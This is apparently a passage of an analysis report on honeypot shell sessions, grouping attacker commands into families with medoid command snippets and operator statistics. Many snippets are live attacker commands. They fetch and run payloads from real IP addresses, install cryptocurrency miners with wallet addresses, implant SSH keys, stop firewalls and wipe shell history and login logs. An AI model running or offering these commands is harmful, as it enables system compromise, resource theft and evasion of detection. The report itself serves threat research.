[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('whoami', ';'), ('lscpu', '|'), ('grep', ';'), ('uname', ';'), ('whoami', ';'), ('lscpu', '|'), ('grep', ';'), ('df', '|'), ('head', '|'), ('awk', ';'), ('df', '|'), ('head', '|'), ('awk', 'EOS')]
```

Top operators: [('grep', 10), ('awk', 6), ('uname', 6), ('cat', 4), ('head', 4), ('cd', 3), ('free', 2), ('ls', 2), ('which', 2), ('crontab', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 45b96e92065952e7 | 3da52331489d |       30 |

## Family 93

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=460ebc8adbd2a246` (session `013bfbf8a35e`, n_rows=5)  

**Medoid commands (snippet):**

```bash
echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
enable
shell
sh
ping; sh
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('enable', ';'), ('shell', ';'), ('sh', ';'), ('ping', ';'), ('sh', 'EOS')]
```

Top operators: [('sh', 2), ('echo', 1), ('enable', 1), ('shell', 1), ('ping', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 460ebc8adbd2a246 | 013bfbf8a35e |        5 |

## Family 102

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=4647e5b026985b41` (session `1ce56ad2ee69`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp || cd /run || cd /; curl -O http://jahid.seythen.com/gunnybagsbunnybins.sh || wget http://jahid.seythen.com/gunnybagsbunnybins.sh; chmod 777 gunnybagsbunnybins.sh; sh gunnybagsbunnybins.sh
```

Consensus (op, conn) pairs:

```python
[('cd', '||'), ('cd', '||'), ('cd', ';'), ('curl', '||'), ('wget', ';'), ('chmod', ';'), ('sh', 'EOS')]
```

Top operators: [('cd', 3), ('curl', 1), ('wget', 1), ('chmod', 1), ('sh', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 4647e5b026985b41 | 1ce56ad2ee69 |        1 |

## Family 185

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=475adc0dc9388f1c` (session `34e1e3c9f778`, n_rows=2)  

**Medoid commands (snippet):**

```bash
>/tmp/.f && cd /tmp/ && rm -rf /tmp/.f && wget -O -> .t http://194.31.98.244/ssh/mips && chmod +x .t && ./.t test.load.mips
>/tmp/.f && cd /tmp/ && rm -rf /tmp/.f && wget -O -> .t http://194.31.98.244/ssh/mipsel && chmod +x .t && ./.t test.load.mipsel
```

Consensus (op, conn) pairs:

```python
[('>', '&&'), ('cd', '&&'), ('rm', '&&'), ('wget', '&&'), ('chmod', '&&'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', '&&'), ('rm', '&&'), ('wget', '&&'), ('chmod', '&&'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('>', 2), ('cd', 2), ('rm', 2), ('wget', 2), ('chmod', 2), ('PH_EXEC_1', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 475adc0dc9388f1c | 34e1e3c9f778 |        2 |

## Family 131

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=4fd18b7556c6f36c` (session `1884af743a7f`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; wget 51.89.91.81/ok.sh; chmod 777 ok.sh; ./ok.sh; rm -rf ok.sh; history -c; cd /tmp; curl -O 51.89.91.81/ok.sh; chmod 777 ok.sh; ./ok.sh; rm -rf ok.sh; history -c
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('history', ';'), ('cd', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('history', 'EOS')]
```

Top operators: [('cd', 2), ('chmod', 2), ('PH_EXEC_1', 2), ('rm', 2), ('history', 2), ('wget', 1), ('curl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 4fd18b7556c6f36c | 1884af743a7f |        1 |

## Family 46

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=52cb75d10f744e62` (session `4c3ddd7e1295`, n_rows=1)  

**Medoid commands (snippet):**

```bash
lscpu
```

Consensus (op, conn) pairs:

```python
[('lscpu', 'EOS')]
```

Top operators: [('lscpu', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 52cb75d10f744e62 | 4c3ddd7e1295 |        1 |

## Family 143

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=557c29151269aca2` (session `017215fecb79`, n_rows=7)  

**Medoid commands (snippet):**

```bash
uname -a
cat /proc/cpuinfo
free -m
dmidecode | grep Vendor | head -n 1
ps -x
dmesg | grep irtual
lspci | grep irti
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('cat', ';'), ('free', ';'), ('dmidecode', '|'), ('grep', '|'), ('head', ';'), ('ps', ';'), ('dmesg', '|'), ('grep', ';'), ('lspci', '|'), ('grep', 'EOS')]
```

Top operators: [('grep', 3), ('uname', 1), ('cat', 1), ('free', 1), ('dmidecode', 1), ('head', 1), ('ps', 1), ('dmesg', 1), ('lspci', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 557c29151269aca2 | 017215fecb79 |        7 |

## Family 97

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=559938c905f528af` (session `085b36a6129e`, n_rows=3)  

**Medoid commands (snippet):**

```bash
free -m
add user fox
help
```

Consensus (op, conn) pairs:

```python
[('free', ';'), ('add', ';'), ('help', 'EOS')]
```

Top operators: [('free', 1), ('add', 1), ('help', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 559938c905f528af | 085b36a6129e |        3 |

## Family 150

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=585c162b1e4aa6bf` (session `3b1840a6e547`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget 171.22.30.217/epic; sh epic; rm -rf epic; history -c; curl -O 171.22.30.217/epic; sh epic; rm -rf epic; history -c
```

Consensus (op, conn) pairs:

```python
[('wget', ';'), ('sh', ';'), ('rm', ';'), ('history', ';'), ('curl', ';'), ('sh', ';'), ('rm', ';'), ('history', 'EOS')]
```

Top operators: [('sh', 2), ('rm', 2), ('history', 2), ('wget', 1), ('curl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 585c162b1e4aa6bf | 3b1840a6e547 |        1 |

## Family 153

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=59726455756637d4` (session `2137c60f3b9a`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget http://64.93.80.146/test.sh; chmod 777 test.sh; sh test.sh; history -c
```

Consensus (op, conn) pairs:

```python
[('wget', ';'), ('chmod', ';'), ('sh', ';'), ('history', 'EOS')]
```

Top operators: [('wget', 1), ('chmod', 1), ('sh', 1), ('history', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 59726455756637d4 | 2137c60f3b9a |        1 |

## Family 162

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=59d5b72b3e6874e8` (session `3cb2d818fb64`, n_rows=30)  

**Medoid commands (snippet):**

```bash
sh
shell
enable
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZG ...
```

Consensus (op, conn) pairs:

```python
[('sh', ';'), ('shell', ';'), ('enable', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('sh', ';'), ('shell', ';'), ('enable', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('PH_EXEC_1', ';'), ('>', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('PH_EXEC_1', ';'), ('>', 'EOS')]
```

Top operators: [('cp', 54), ('chmod', 38), ('cd', 22), ('rm', 20), ('mkdir', 20), ('>', 20), ('mount', 18), ('busybox', 6), ('echo', 4), ('wget', 4)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 59d5b72b3e6874e8 | 3cb2d818fb64 |       30 |

## Family 175

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=5a4202d8dfe09f6d` (session `dc4d2393562c`, n_rows=3)  

**Medoid commands (snippet):**

```bash
nano a
pico a
exit
```

Consensus (op, conn) pairs:

```python
[('nano', ';'), ('pico', ';'), ('exit', 'EOS')]
```

Top operators: [('nano', 1), ('pico', 1), ('exit', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5a4202d8dfe09f6d | dc4d2393562c |        3 |

## Family 120

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=5b2e48e494c0260c` (session `2c4e1551ce44`, n_rows=2)  

**Medoid commands (snippet):**

```bash
ifconfig
cat /proc/cpuinfo
```

Consensus (op, conn) pairs:

```python
[('ifconfig', ';'), ('cat', 'EOS')]
```

Top operators: [('ifconfig', 1), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5b2e48e494c0260c | 2c4e1551ce44 |        2 |

## Family 167

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=5bf03f631bed815e` (session `1d740257b491`, n_rows=1)  

**Medoid commands (snippet):**

```bash
uname -a; lspci | grep -i --color 'vga\\ | 3d\\ | 2d'; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekP ...
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('lspci', '|'), ('grep', ';'), ('curl', '|'), ('bash', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', 'EOS')]
```

Top operators: [('bash', 2), ('uname', 1), ('lspci', 1), ('grep', 1), ('curl', 1), ('echo', 1), ('chpasswd', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5bf03f631bed815e | 1d740257b491 |        1 |

## Family 164

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=5ca6cc519d96cb5b` (session `02a1fa2f158b`, n_rows=4)  

**Medoid commands (snippet):**

```bash
sh
shell
enable
cd /tmp; cd /dev; cd /mnt; cd /var; rm -rf sh; wget http://37.0.11.168/sh || curl -O http://37.0.11.168/sh || tftp -g -r sh 37.0.11.168; chmod 777 sh; ./sh root; rm -rf sh
```

Consensus (op, conn) pairs:

```python
[('sh', ';'), ('shell', ';'), ('enable', ';'), ('cd', ';'), ('cd', ';'), ('cd', ';'), ('cd', ';'), ('rm', ';'), ('wget', '||'), ('curl', '||'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', 'EOS')]
```

Top operators: [('cd', 4), ('rm', 2), ('sh', 1), ('shell', 1), ('enable', 1), ('wget', 1), ('curl', 1), ('tftp', 1), ('chmod', 1), ('PH_EXEC_1', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5ca6cc519d96cb5b | 02a1fa2f158b |        4 |

## Family 122

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=5e19a0559a3e6e2e` (session `0569e04d2e54`, n_rows=4)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
cat /proc/mounts
echo -e '\\x72\\x70\\x70\\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag
echo -e '\\x4d\\x4f\\x55\\x4e\\x54\\x53\\x5f\\x44\\x4f\\x4e\\x45'
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('cat', ';'), ('echo', ';'), ('cat', ';'), ('rm', ';'), ('echo', 'EOS')]
```

Top operators: [('cat', 3), ('echo', 2), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5e19a0559a3e6e2e | 0569e04d2e54 |        4 |

## Family 171

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=5f0d16f01547c026` (session `02cf1223102a`, n_rows=1)  

**Medoid commands (snippet):**

```bash
echo -n b3frzj4l | md5sum; uname -a
```

Consensus (op, conn) pairs:

```python
[('echo', '|'), ('md5sum', ';'), ('uname', 'EOS')]
```

Top operators: [('echo', 1), ('md5sum', 1), ('uname', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5f0d16f01547c026 | 02cf1223102a |        1 |

## Family 136

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=5fffdf2eb4f251c1` (session `ec09d218f6fc`, n_rows=3)  

**Medoid commands (snippet):**

```bash
mkdir /mnt/; mount -o remount, rw /mnt/; cp /bin/echo /mnt/.z && >/mnt/.z && cd /mnt/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d
wget || busybox wget || wd1; curl || busybox curl || cd1; echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
wget http://95.2 ...
```

Consensus (op, conn) pairs:

```python
[('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';'), ('echo', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('PH_EXEC_1', ';'), ('>', 'EOS')]
```

Top operators: [('cp', 3), ('busybox', 3), ('>', 2), ('chmod', 2), ('wget', 2), ('wd1', 2), ('mkdir', 1), ('mount', 1), ('cd', 1), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5fffdf2eb4f251c1 | ec09d218f6fc |        3 |

## Family 148

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=60a1c75367cb7d42` (session `1cf74c52e983`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget http://80.94.92.49/d -O- | sh
```

Consensus (op, conn) pairs:

```python
[('wget', '|'), ('sh', 'EOS')]
```

Top operators: [('wget', 1), ('sh', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 60a1c75367cb7d42 | 1cf74c52e983 |        1 |

## Family 163

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=636919db89f45da1` (session `078d05c91189`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cat /etc/issue; cd /tmp; wget http://193.42.33.81/Gummybins.sh; chmod +x Gummybins.sh; sh Gummybins.sh; rm -rf *
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('rm', 'EOS')]
```

Top operators: [('cat', 1), ('cd', 1), ('wget', 1), ('chmod', 1), ('sh', 1), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 636919db89f45da1 | 078d05c91189 |        1 |

## Family 145

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=63bfd9408bfeb64f` (session `f8842a407124`, n_rows=7)  

**Medoid commands (snippet):**

```bash
whoami
id
ps
bash
sh
ksh
ps
```

Consensus (op, conn) pairs:

```python
[('whoami', ';'), ('id', ';'), ('ps', ';'), ('bash', ';'), ('sh', ';'), ('sh', ';'), ('ps', 'EOS')]
```

Top operators: [('ps', 2), ('sh', 2), ('whoami', 1), ('id', 1), ('bash', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 63bfd9408bfeb64f | f8842a407124 |        7 |

## Family 173

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=68a36efcb1f6b404` (session `1562a16b23cd`, n_rows=1)  

**Medoid commands (snippet):**

```bash
which wget
```

Consensus (op, conn) pairs:

```python
[('which', 'EOS')]
```

Top operators: [('which', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 68a36efcb1f6b404 | 1562a16b23cd |        1 |

## Family 176

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=6b396fa0772d8ba7` (session `f4fc878a90b4`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget https://www.viessmann.co.uk -outfile bob; sh
```

Consensus (op, conn) pairs:

```python
[('wget', ';'), ('sh', 'EOS')]
```

Top operators: [('wget', 1), ('sh', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 6b396fa0772d8ba7 | f4fc878a90b4 |        1 |

## Family 111

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=6bff414c63de7654` (session `9a7ab91ef9df`, n_rows=4)  

**Medoid commands (snippet):**

```bash
service iptables stop
cd /tmp; wget http://117.67.110.182:1234/phparm; chmod 777 phparm; ./phparm
cd /tmp; wget http://117.67.110.182:1234/phpmips; chmod 777 phpmips; ./phpmips
cd /tmp; wget http://117.67.110.182:1234/phpwrt; chmod 777 phpwrt; ./phpwrt
```

Consensus (op, conn) pairs:

```python
[('systemctl', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_3', 'EOS')]
```

Top operators: [('cd', 3), ('wget', 3), ('chmod', 3), ('systemctl', 1), ('PH_EXEC_1', 1), ('PH_EXEC_2', 1), ('PH_EXEC_3', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 6bff414c63de7654 | 9a7ab91ef9df |        4 |

## Family 169

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=6c70892ff8102a6d` (session `9e226edcf1cc`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget --version
```

Consensus (op, conn) pairs:

```python
[('wget', 'EOS')]
```

Top operators: [('wget', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 6c70892ff8102a6d | 9e226edcf1cc |        1 |

## Family 178

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=6e6455a7ab4979bf` (session `060ad39a899c`, n_rows=1)  

**Medoid commands (snippet):**

```bash
curl -O http://45.90.160.54/systemd; wget http://45.90.160.54/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 47Yz2np6PGzMw1u2WYpgW2Qv8WMfsy1dKLYsH9GMP9d5ZKZ6GqcGJ86YbKQ8t5MUFGHrA2j61QwNx9yD1oe2ek6DVptxdE7 -k --tls --rig-id ZTX1
```

Consensus (op, conn) pairs:

```python
[('curl', ';'), ('wget', '&&'), ('chmod', '&&'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('curl', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 6e6455a7ab4979bf | 060ad39a899c |        1 |

## Family 48

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=7103f1d5b741342b` (session `25b4e72dd1dd`, n_rows=5)  

**Medoid commands (snippet):**

```bash
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH; history -n; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
uname
ps -x
cat /proc/cpuinfo
free -m
```

Consensus (op, conn) pairs:

```python
[('unset', ';'), ('history', ';'), ('export', ';'), ('export', ';'), ('export', ';'), ('uname', ';'), ('ps', ';'), ('cat', ';'), ('free', 'EOS')]
```

Top operators: [('export', 3), ('unset', 1), ('history', 1), ('uname', 1), ('ps', 1), ('cat', 1), ('free', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 7103f1d5b741342b | 25b4e72dd1dd |        5 |

## Family 76

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=72a9e3337d05c088` (session `9275a8bf4297`, n_rows=7)  

**Medoid commands (snippet):**

```bash
uname -a
whoami
pwd
ls
cd ..
ls
exit
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('whoami', ';'), ('pwd', ';'), ('ls', ';'), ('cd', ';'), ('ls', ';'), ('exit', 'EOS')]
```

Top operators: [('ls', 2), ('uname', 1), ('whoami', 1), ('pwd', 1), ('cd', 1), ('exit', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 72a9e3337d05c088 | 9275a8bf4297 |        7 |

## Family 113

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=7584c543d32d5644` (session `a54cbc60f27d`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cat /proc/cpuinfo | grep name | cut -f2 -d':' | uniq -c; uname -a
```

Consensus (op, conn) pairs:

```python
[('cat', '|'), ('grep', '|'), ('cut', '|'), ('uniq', ';'), ('uname', 'EOS')]
```

Top operators: [('cat', 1), ('grep', 1), ('cut', 1), ('uniq', 1), ('uname', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 7584c543d32d5644 | a54cbc60f27d |        1 |

## Family 115

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=7953ec8965052d79` (session `5fea41dc01bd`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget http://207.167.64.147/bins/x86; curl -O http://207.167.64.147/bins/x86; cat x86 >worker; chmod +x *; ./worker Zeus.AutoRoot; rm -rf x86; rm -rf worker; >/var/log/lastlog; >/var/log/wtmp; >/var/log/btmp; rm -rf .bash_history; history -c
```

Consensus (op, conn) pairs:

```python
[('wget', ';'), ('curl', ';'), ('cat', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('rm', ';'), ('>', ';'), ('>', ';'), ('>', ';'), ('rm', ';'), ('history', 'EOS')]
```

Top operators: [('rm', 3), ('>', 3), ('wget', 1), ('curl', 1), ('cat', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('history', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 7953ec8965052d79 | 5fea41dc01bd |        1 |

## Family 110

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=7d997afcb579f975` (session `8b7021f01fdc`, n_rows=26)  

**Medoid commands (snippet):**

```bash
curl -o dmfile http://23.254.247.214/Heisenbergbins.sh
ls -rlt
file dmfile
file dmfile
head dmfile
wget http://23.254.247.214/x86
ks 0krt
ls -lrt
./x86
head x86
head dmfile
cat dmfile
chmod +x x86
ls -lrt
chmod +x x86
./x86
bash x86
ps -eaf
sha256 dmfile
sha25 ...
```

Consensus (op, conn) pairs:

```python
[('curl', ';'), ('ls', ';'), ('file', ';'), ('file', ';'), ('head', ';'), ('wget', ';'), ('ks', ';'), ('ls', ';'), ('PH_EXEC_1', ';'), ('head', ';'), ('head', ';'), ('cat', ';'), ('chmod', ';'), ('ls', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('bash', ';'), ('ps', ';'), ('sha256', ';'), ('sha256sum', ';'), ('md5sum', ';'), ('ls', ';'), ('exec', ';'), ('bash', ';'), ('ls', ';'), ('cat', 'EOS')]
```

Top operators: [('ls', 5), ('head', 3), ('file', 2), ('PH_EXEC_1', 2), ('cat', 2), ('chmod', 2), ('bash', 2), ('curl', 1), ('wget', 1), ('ks', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 7d997afcb579f975 | 8b7021f01fdc |       26 |

## Family 124

